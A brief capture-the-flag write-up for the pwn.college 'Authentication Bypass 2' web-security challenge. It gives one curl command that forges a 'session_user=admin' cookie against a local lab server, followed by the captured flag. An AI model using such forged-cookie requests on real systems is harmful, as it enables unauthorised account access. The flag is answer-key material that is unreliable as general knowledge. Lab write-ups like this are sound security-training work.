# [Authentication Bypass 2](https://pwn.college/intro-to-cybersecurity/web-security/#challenges-header-10)

## Problem
Authentication bypasses are not always so trivial. Sometimes, the logic of the application might look correct, but again, the gap between what the developer expects to be true and what will actually be true rears its ugly head. Give this level a try, and remember: you control the requests, including all the HTTP headers sent!

## Steps

```bash
curl -v http://challenge.localhost:80 --cookie 'session_user=admin'
```

## Solution

```
 pwn.college{ohWV3rQoEd6BvDkdBnD3IECClhY.dJzN1YDL3MTM3QzW}
 ```
